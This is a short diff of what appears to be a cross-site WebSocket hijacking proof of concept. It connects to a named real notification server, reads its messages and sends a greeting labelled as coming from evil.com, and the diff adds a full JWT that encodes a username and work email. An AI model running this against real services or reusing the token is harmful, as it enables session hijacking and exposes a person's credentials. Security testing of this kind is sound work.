@@ -1,5 +1,5 @@
 <script>
-  const ws = new WebSocket("ws://notification.immunefiles.com/ws/immunetalk/?token=Iamtesting");
-  ws.onmessage = (e) => console.log("Stole: " + e.data);
+  const ws = new WebSocket("wss://notification.immunefiles.com/ws/immunetalk/?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1hc29vZCIsImVtYWlsIjoibWFzb29kLmFzbGFtQHBydWRlbnRiaXQuY29tIiwiY3JlIjoiMjAyNS0wNS0yNSAxMzozOToxMS4yNDQzMzgiLCJleHAiOjE3NDgyNjY3NTF9.gqRdHLkhnYzZxkXHML1bguCyXigNjK00znoOfjwEPWA");
+  ws.onmessage = (e) => console.log("Received: " + e.data);
   ws.onopen = () => ws.send(JSON.stringify({ message: "Hi from evil.com" }));
 </script>
